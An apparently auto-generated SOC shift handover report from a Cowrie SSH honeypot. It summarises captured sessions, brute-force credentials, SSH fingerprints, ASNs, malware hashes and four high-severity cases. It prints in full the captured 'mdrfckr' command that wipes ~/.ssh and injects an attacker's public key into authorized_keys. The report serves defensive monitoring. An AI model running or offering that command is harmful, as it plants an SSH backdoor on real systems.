# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-07 |
| **Generated At** | 2026-05-07T17:52:07Z |
| **Shift Time** | 17:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **164** |
| Confirmed Threats | **140** |
| False Positives Filtered | **24** (14.6%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **21** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **160** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **36** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **22** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 6 |
| `admin` | 4 |
| `root` | 4 |
| `user` | 2 |
| `deploy` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `developer` | 2 |
| `root` | 2 |
| `password` | 2 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `ubuntu` | `Qw12345678` | 1 |
| `admin` | `Aa12345678` | 1 |
| `odoo10` | `odoo10` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `mcserver` | `20.116.34.103` | 2026-05-07T16:40:08 |
| `root` | `3245gs5662d34` | `20.116.34.103` | 2026-05-07T16:40:13 |
| `root` | `localadmin` | `20.116.34.103` | 2026-05-07T16:49:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **164** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 40 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 37 | 3 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `7216c7c47391...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 37 | 3 | libssh-based |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.116.34.103`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **36** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS58466` | CHINANET Guangdong province network | 1 | HIGH |
| `AS11556` | Cable & Wireless Panama | 1 | LOW |
| `AS45437` | Real World - The Core | 1 | HIGH |
| `AS41202` | UNITEL LLC | 1 | LOW |
| `AS701` | Verizon Business | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-be974d904614

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-07 16:40 |
| **Last Seen** | 2026-05-07 16:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 16:40:07` | `cowrie.session.connect` |
| `2026-05-07 16:40:07` | `cowrie.client.version` |
| `2026-05-07 16:40:07` | `cowrie.client.kex` |
| `2026-05-07 16:40:08` | `cowrie.login.success` |
| `2026-05-07 16:40:08` | `cowrie.session.params` |
| `2026-05-07 16:40:08` | `cowrie.command.input` |
| `2026-05-07 16:40:08` | `cowrie.command.failed` |
| `2026-05-07 16:40:08` | `cowrie.log.closed` |
| `2026-05-07 16:40:09` | `cowrie.session.params` |
| `2026-05-07 16:40:09` | `cowrie.command.input` |
| `2026-05-07 16:40:09` | `cowrie.session.file_download` |
| `2026-05-07 16:40:09` | `cowrie.log.closed` |
| `2026-05-07 16:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9279ea03acc

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-07 16:40 |
| **Last Seen** | 2026-05-07 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 16:40:12` | `cowrie.session.connect` |
| `2026-05-07 16:40:12` | `cowrie.client.version` |
| `2026-05-07 16:40:12` | `cowrie.client.kex` |
| `2026-05-07 16:40:13` | `cowrie.login.success` |
| `2026-05-07 16:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa92a173f37

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-07 16:49 |
| **Last Seen** | 2026-05-07 16:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 16:49:24` | `cowrie.session.connect` |
| `2026-05-07 16:49:24` | `cowrie.client.version` |
| `2026-05-07 16:49:24` | `cowrie.client.kex` |
| `2026-05-07 16:49:25` | `cowrie.login.success` |
| `2026-05-07 16:49:26` | `cowrie.session.params` |
| `2026-05-07 16:49:26` | `cowrie.command.input` |
| `2026-05-07 16:49:26` | `cowrie.command.failed` |
| `2026-05-07 16:49:26` | `cowrie.log.closed` |
| `2026-05-07 16:49:26` | `cowrie.session.params` |
| `2026-05-07 16:49:26` | `cowrie.command.input` |
| `2026-05-07 16:49:26` | `cowrie.session.file_download` |
| `2026-05-07 16:49:26` | `cowrie.log.closed` |
| `2026-05-07 16:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f9db593466

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-07 16:49 |
| **Last Seen** | 2026-05-07 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-07 16:49:29` | `cowrie.session.connect` |
| `2026-05-07 16:49:29` | `cowrie.client.version` |
| `2026-05-07 16:49:30` | `cowrie.client.kex` |
| `2026-05-07 16:49:30` | `cowrie.login.success` |
| `2026-05-07 16:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.1.16[.]230` | **65** | 2026-05-07 17:45 | 2026-05-07 17:50 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `20.116.34[.]103` | **30** | 2026-05-07 16:08 | 2026-05-07 16:54 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.41[.]68` | **25** | 2026-05-07 17:26 | 2026-05-07 17:31 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `177.54.62[.]68` | **2** | 2026-05-07 17:41 | 2026-05-07 17:50 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `134.195.101[.]206` | 1 | 2026-05-07 15:21 | 2026-05-07 15:21 | 34s | 0 | `T1592` | 🟢 LOW |
| `139.170.141[.]170` | 1 | 2026-05-07 16:33 | 2026-05-07 16:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.113[.]53` | 1 | 2026-05-07 15:55 | 2026-05-07 15:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]117` | 1 | 2026-05-07 17:33 | 2026-05-07 17:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.18.113[.]233` | 1 | 2026-05-07 17:36 | 2026-05-07 17:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `161.97.152[.]15` | 1 | 2026-05-07 15:24 | 2026-05-07 15:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `178.154.192[.]177` | 1 | 2026-05-07 15:01 | 2026-05-07 15:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.62.80[.]214` | 1 | 2026-05-07 15:06 | 2026-05-07 15:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.218.12[.]64` | 1 | 2026-05-07 17:15 | 2026-05-07 17:15 | 13s | 0 | `T1592` | 🟢 LOW |
| `210.14.142[.]89` | 1 | 2026-05-07 17:34 | 2026-05-07 17:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.252.31[.]106` | 1 | 2026-05-07 14:43 | 2026-05-07 14:43 | 4s | 0 | `T1592` | 🟢 LOW |
| `46.8.145[.]130` | 1 | 2026-05-07 14:40 | 2026-05-07 14:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-05-07 16:17 | 2026-05-07 16:17 | 42s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]228` | 1 | 2026-05-07 14:35 | 2026-05-07 14:35 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.123.41[.]68` | PK | CMPak Limited | **100** ⚠️ | 9 |
| `134.195.101[.]206` | US | Black Mesa Corporation | **100** ⚠️ | 0 |
| `222.252.31[.]106` | VN | Hanoi Post and Telecom Company | **100** ⚠️ | 10 |
| `139.170.141[.]170` | CN | China Unicom Qinghai province network | **100** ⚠️ | 24 |
| `178.62.80[.]214` | GB | DigitalOcean London | **100** ⚠️ | 0 |
| `189.218.12[.]64` | MX | Television Internacional, S.A. de C.V. | **100** ⚠️ | 1 |
| `178.154.192[.]177` | RU | Yandex.Cloud LLC | **100** ⚠️ | 2 |
| `14.18.113[.]233` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `177.54.62[.]68` | BR | COAN INDUSTRIA GRAFICA LTDA. | **100** ⚠️ | 5 |
| `161.97.152[.]15` | FR | Contabo GmbH | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 42 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 32 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 164 cases |
| Tool 34  | Credential Extractor        | ✅ 36 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 24 filtered (14.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 18 recon entry/entries in table (4 group(s) consolidating 122 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-07T17:52:07Z_
